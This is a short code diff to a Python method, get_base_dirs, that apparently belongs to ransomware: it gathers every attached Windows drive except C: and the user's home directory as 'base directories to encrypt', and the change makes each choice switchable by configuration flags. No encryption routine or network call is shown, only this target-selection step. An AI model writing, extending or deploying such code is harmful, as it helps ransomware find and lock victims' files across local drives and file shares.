@@ -110,18 +110,20 @@ class Base():
         ]
     
 
-    def get_base_dirs(self, home_dir):
+    def get_base_dirs(self, home_dir, __config):
       # Function to return a list of base directories to encrypt
       base_dirs = []
       
       # Add attached drives and file shares
-      attached_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
-      for drive in attached_drives:
-          if drive[0] != 'C':
-              base_dirs.append(drive)
+      if __config["encrypt_attached_drives"] is True:
+          attached_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
+          for drive in attached_drives:
+              if drive[0] != 'C':
+                  base_dirs.append(drive)
       
       # Add C:\\ user space directories
-      base_dirs.append(home_dir)
+      if __config["encrypt_user_home"] is True:
+          base_dirs.append(home_dir)
           
 
       return base_dirs
